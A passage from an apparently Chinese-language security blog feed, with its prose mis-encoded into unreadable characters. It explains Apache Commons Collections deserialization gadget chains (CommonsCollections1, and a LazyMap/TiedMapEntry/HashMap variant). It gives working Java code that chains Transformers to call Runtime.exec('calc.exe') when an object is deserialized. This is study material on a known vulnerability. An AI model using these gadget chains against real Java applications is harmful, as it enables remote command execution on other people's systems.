&#125;<br></code></pre></td></tr></table></figure><p>åœ¨HashMapçš„readObjectæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†<code>hash(key)</code>ï¼Œè€Œhashæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†<code>key.hashCode()</code></p><p>æˆ‘ä»¬åªéœ€è¦è®©è¿™ä¸ªkeyç­‰äºTiedMapentryå¯¹è±¡ï¼Œå³å¯æ„æˆä¸€ä¸ªå®Œæ•´çš„Gadget</p><h3 id="æ„é€ Gadget"><a href="#æ„é€ Gadget" class="headerlink" title="æ„é€ Gadget"></a>æ„é€ Gadget</h3><p>é¦–å…ˆæŠŠæ¶æ„çš„LazyMapæ„é€ å‡ºæ¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>å°†æ¶æ„çš„LazyMapå¯¹è±¡ä½œä¸ºTiedMapEntryçš„Mapå±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;key&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä¸ºäº†è°ƒç”¨<code>TiedMapEntry.hashCode()</code>ï¼Œæˆ‘ä»¬éœ€è¦å°†<code>tme</code>å¯¹è±¡ä½œä¸º<code>HashMap</code>çš„ä¸€ä¸ªkey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br></code></pre></td></tr></table></figure><p>æœ€åï¼Œå°†<code>expMap</code>ä½œä¸ºå¯¹è±¡æ¥åºåˆ—åŒ–</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;<br>ObjectOutputStream oss = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;<br>oss.write<span class="hljs-constructor">Object(<span class="hljs-params">expMap</span>)</span>;<br>oss.close<span class="hljs-literal">()</span>;<br><br><span class="hljs-comment">// ååºåˆ—</span><br>ByteArrayInputStream bari = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>);<br>ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">bari</span>)</span>;<br>ois.read<span class="hljs-constructor">Object()</span>;<br>ois.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸ</p><p><img src="https://img.katck.com/images/2023/05/07/62062f6b69cae20343077fd7d737555f.png" alt="image-20230507105548700"></p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections1</title>
    <link href="/2023/05/06/CommonsCollections1/"/>
    <url>/2023/05/06/CommonsCollections1/</url>
    
    <content type="html"><![CDATA[<h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h4 id="ysoserial-Gadget"><a href="#ysoserial-Gadget" class="headerlink" title="ysoserial Gadget"></a>ysoserial Gadget</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">Map(Proxy).entrySet()</span><br><span class="hljs-comment">AnnotationInvocationHandler.invoke()</span><br><span class="hljs-comment">LazyMap.get()</span><br><span class="hljs-comment">ChainedTransformer.transform()</span><br><span class="hljs-comment">ConstantTransformer.transform()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Class.getMethod()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.getRuntime()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.exec()</span><br><span class="hljs-comment">Requires:</span><br><span class="hljs-comment">commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="CommonsCollection"><a href="#CommonsCollection" class="headerlink" title="CommonsCollection"></a>CommonsCollection</h3><blockquote><p>Apache Commons Collectionsæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ã€‚</p></blockquote><p>CommonsCollectionå®ç°äº†ä¸€ä¸ªTransformedMapç±»ï¼Œè¯¥ç±»æ˜¯å¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapæ¥å£çš„ä¸€ä¸ªæ‰©å±•ã€‚<strong>è¯¥ç±»å¯ä»¥åœ¨ä¸€ä¸ªå…ƒç´ è¢«æ·»åŠ åˆ°é›†åˆå†…æ—¶ï¼Œè‡ªåŠ¨å¯¹è¯¥å…ƒç´ è¿›è¡Œç‰¹å®šçš„ä¿®é¥°å˜æ¢ï¼Œå…·ä½“çš„å˜æ¢é€»è¾‘ç”±Transformerç±»å®šä¹‰ï¼ŒTransformeråœ¨TransformedMapå®ä¾‹åŒ–çš„æ—¶å€™ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚</strong>è¿™ä¹Ÿæ˜¯è¿™ä¸ªåˆ©ç”¨é“¾çš„æ ¸å¿ƒã€‚</p><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>Transformeræ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ƒåªæœ‰ä¸€ä¸ªå¾…å®ç°çš„æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Apache Commons Collections å·²ç»å†…ç½®äº†ä¸€äº›å¸¸è§çš„Transformer</p><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>é€šè¿‡<code>TransformedMap.decorate()</code>æ–¹æ³•ï¼Œå¯ä»¥è·å¾—ä¸€ä¸ª<code>TransformedMap</code>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">tansformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map, keyTransformer, valueTransformer);<br></code></pre></td></tr></table></figure><p>å½“TransformedMapå†…çš„keyæˆ–valueå‘ç”Ÿå˜æ¢æ—¶ï¼Œå°±ä¼šè§¦å‘ç›¸åº”Transformerçš„<code>transform()</code>æ–¹æ³•ã€‚</p><p>è¿˜å¯ä»¥ä½¿ç”¨Transformeræ•°ç»„æ„é€ æˆChainedTransformerã€‚å½“è§¦å‘æ—¶ï¼ŒChainedTransformerå¯ä»¥æŒ‰é¡ºåºè°ƒç”¨ä¸€ç³»åˆ—å˜æ¢ã€‚</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformerå®ç°äº†<code>transform</code>æ–¹æ³•ï¼Œå®ƒçš„è¿‡ç¨‹å°±æ˜¯åœ¨æ„é€ å‡½æ•°ä¸­ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ç”¨<code>transform</code>æ–¹æ³•å°†è¿™ä¸ªå¯¹è±¡å†è¿”å›ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br><span class="hljs-built_in">super</span>();<br>iConstant = constantToReturn;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br><span class="hljs-keyword">return</span> iConstant;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformerä¹Ÿæ˜¯å®ç°äº†Transformeræ¥å£çš„ä¸€ä¸ªç±»ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†å†…éƒ¨çš„å¤šä¸ªTransformerä¸²èµ·æ¥ã€‚</p><p>å‰ä¸€ä¸ªå›è°ƒè¿”å›çš„ç»“æœï¼Œä½œä¸ºåä¸€ä¸ªå›è°ƒçš„å‚æ•°ä¼ å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br><span class="hljs-built_in">super</span>();<br>iTransformers = transformers;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>object = iTransformers[i].transform(object);<br>&#125;<br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformerå®ç°äº†<code>transform</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(<span class="hljs-built_in">this</span>.iMethodName, <span class="hljs-built_in">this</span>.iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-built_in">this</span>.iArgs);<br>        &#125; ...<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨Javaåå°„æœºåˆ¶è°ƒç”¨äº†inputå¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•ï¼Œè€Œæ–¹æ³•åæ—¶å®ä¾‹åŒ–InvokerTransformeræ—¶ä¼ å…¥çš„<code>iMethodName</code>æˆå‘˜å˜é‡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´è¿™æ®µåå°„ä»£ç ä¸­è°ƒç”¨çš„æ–¹æ³•åå’ŒClasså¯¹è±¡éƒ½æ˜¯å¯æ§çš„ã€‚æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„çš„Transformeré“¾ï¼Œå€Ÿç”¨<code>InvokerTransformer.transform()</code>æ‰§è¡Œä»»æ„å‘½ä»¤</p><h2 id="åˆ©ç”¨Transformeré“¾æ‰§è¡Œå‘½ä»¤"><a href="#åˆ©ç”¨Transformeré“¾æ‰§è¡Œå‘½ä»¤" class="headerlink" title="åˆ©ç”¨Transformeré“¾æ‰§è¡Œå‘½ä»¤"></a>åˆ©ç”¨Transformeré“¾æ‰§è¡Œå‘½ä»¤</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒè¯•è·Ÿè¸ªä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">Map</span>.put() =&gt; TransformedMap.transformValue() =&gt; ChainedTransformer =&gt; ConstantTransformer.transform() =&gt; InvokerTransformer.transform() =&gt; Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="é€šè¿‡ååºåˆ—åŒ–è§¦å‘Transformeré“¾"><a href="#é€šè¿‡ååºåˆ—åŒ–è§¦å‘Transformeré“¾" class="headerlink" title="é€šè¿‡ååºåˆ—åŒ–è§¦å‘Transformeré“¾"></a>é€šè¿‡ååºåˆ—åŒ–è§¦å‘Transformeré“¾</h2><p>å¦‚æœJavaåº”ç”¨æ²¡æœ‰å¯¹ä¼ å…¥çš„åºåˆ—åŒ–æ•°æ®è¿›è¡Œå®‰å…¨æ€§æ£€æŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ¶æ„çš„<code>TransformedMap</code>åºåˆ—åŒ–åï¼Œè¿œç¨‹æäº¤ç»™Javaåº”ç”¨ï¼Œå³å¯æˆåŠŸæ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚</p><p>ä¸Šé¢é€šè¿‡<code>Map.put()</code>è§¦å‘äº†æ•´ä¸ªåˆ©ç”¨é“¾ï¼Œä½†å¦‚ä½•å®ç°è‡ªåŠ¨è§¦å‘å‘¢ï¼Ÿ</p><p>åœ¨è¿›è¡Œåºåˆ—åŒ–çš„æ—¶ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨<code>ObjectInputStream</code>ç±»çš„<code>readObject()</code>æ–¹æ³•ï¼Œå¦‚æœè¢«ååºåˆ—åŒ–çš„ç±»é‡å†™äº†<code>readObject()</code>ï¼Œé‚£ä¹ˆè¯¥ç±»åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJavaä¼šä¼˜å…ˆè°ƒç”¨é‡å†™çš„<code>readObject()</code>æ–¹æ³•ã€‚</p><p>å¦‚æœæœ‰æŸä¸ªç±»ï¼Œé‡å†™äº†<code>readObject()</code>æ–¹æ³•ï¼Œå¹¶ä¸”å®ƒçš„<code>readObject()</code>æ–¹æ³•ä¸­å¯¹Mapç±»å‹çš„å˜é‡è¿›è¡Œäº†é”®å€¼ä¿®æ”¹æ“ä½œï¼Œå¹¶ä¸”è¿™ä¸ªMapæ˜¯å¯æ§çš„ï¼Œå°±å¯ä»¥è§¦å‘åˆ©ç”¨é“¾ã€‚</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>äºæ˜¯ysoserialæ‰¾åˆ°äº†<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ç±»</p><p>çœ‹ä¸€ä¸‹å®ƒçš„<code>readObject()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    var1.defaultReadObject();<br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        var2 = AnnotationType.getInstance(<span class="hljs-built_in">this</span>.type);<br>    &#125; <span class="hljs-keyword">catch</span> ...<br><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.memberTypes();<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.entrySet().iterator();<br><br>    <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>        Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> (Map.Entry)var4.next();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (String)var5.getKey();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> (Class)var3.get(var6);<br>        <span class="hljs-keyword">if</span> (var7 != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var5.getValue();<br>            <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                var5.setValue((<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>å®ƒçš„æˆå‘˜å˜é‡<code>memberValue</code>ä¸º<code>Map&lt;String, Object&gt;</code> ç±»å‹å¹¶ä¸”å¯æ§ï¼Œ<code>var5.setValue</code>  å¯¹Mapç±»å‹çš„å˜é‡è¿›è¡Œäº†é”®å€¼æ“ä½œã€‚å®Œç¾ï¼Œéå¸¸ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ª<code>AnnotationInvocationHandler</code>ç±»ï¼Œå°†å…¶æˆå‘˜å˜é‡<code>memberValue</code>è®¾ç½®ä¸ºç²¾å¿ƒæ„é€ çš„<code>TransformedMap</code>å¯¹è±¡ã€‚</p><p>ç„¶åå°†å…¶åºåˆ—åŒ–ï¼Œæäº¤ç»™æœªç»å®‰å…¨æ£€æµ‹çš„åº”ç”¨ã€‚Javaåº”ç”¨åœ¨è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œåˆ™ä¼šè§¦å‘<code>TransformedMap</code>çš„å˜æ¢å‡½æ•°ï¼Œæ‰§è¡Œé¢„è®¾çš„å‘½ä»¤ã€‚</p><h4 id="è‡ªåŠ¨è§¦å‘Transformeråˆ©ç”¨é“¾"><a href="#è‡ªåŠ¨è§¦å‘Transformeråˆ©ç”¨é“¾" class="headerlink" title="è‡ªåŠ¨è§¦å‘Transformeråˆ©ç”¨é“¾"></a>è‡ªåŠ¨è§¦å‘Transformeråˆ©ç”¨é“¾</h4><p>å› ä¸º<code>sun.reflect.annotation.AnnotationInvocationHandler</code>æ˜¯JDKå†…éƒ¨çš„ç±»ï¼Œä¸èƒ½é€šè¿‡newæ¥å®ä¾‹åŒ–ã€‚ä½†å¯ä»¥ä½¿ç”¨åå°„è·å–å®ƒçš„æ„é€ æ–¹æ³•ï¼Œä¿®æ”¹è®¿é—®æƒé™ï¼Œå†è°ƒç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, outerMap);<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>java.lang.Runtime</code>å¹¶ä¸èƒ½åºåˆ—åŒ–ï¼Œå› ä¸ºå®ƒæ²¡æœ‰å®ç°<code>java.io.Serializable</code>æ¥å£ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„çš„æ–¹å¼æ¥è·å–å½“å‰ä¸Šä¸‹æ–‡çš„Runtimeå¯¹è±¡ï¼Œè€Œä¸ç›´æ¥å®ä¾‹åŒ–è¿™ä¸ªç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) m.invoke(<span class="hljs-literal">null</span>);<br>r.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>å†™æˆTransformer</strong></p><figure class="highlight java"><table><tr><td 